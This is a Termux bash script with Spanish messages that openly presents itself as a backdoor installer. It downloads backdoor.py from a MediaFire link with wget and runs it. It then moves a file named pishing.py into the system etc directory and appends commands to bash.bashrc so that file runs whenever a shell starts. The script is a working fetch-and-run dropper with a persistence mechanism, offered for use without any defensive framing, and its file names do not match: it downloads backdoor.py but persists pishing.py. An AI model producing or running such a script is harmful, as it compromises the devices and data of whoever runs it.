#!/bin/bash
printf "\e[1;31m Bienvenido al script bash\n"
sleep 5
clear
printf "\e[1;31m Este script ejecutara un backdoor python y le pondra persistencia\n"
sleep 3
clear
pkg install python -y
pkg install wget -y
pkg install python2 -y
printf "\e[1;31m Herramientas instaladas se descargara el backdoor en 5 segundos\n"
wget https://download1645.mediafire.com/zvqmobv354zg/gq3eu1315jk8sy9/backdoor.py
chmod +x backdoor.py
python backdoor.py
termux-setup-storage
mv pishing.py /data/data/com.termux/files/usr/etc/
cd /data/data/com.termux/files/usr/etc/
sleep 1
clear
printf "\e[1;31m Agregando persistencia al backdoo en 5 segundos\n"
sleep 5
clear
echo "cd /data/data/com.termux/files/usr/etc/" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "python pishing.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "cd" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
printf "\e[1;31m Persistencia agregada...\n"
sleep 5
cd $HOME
exit
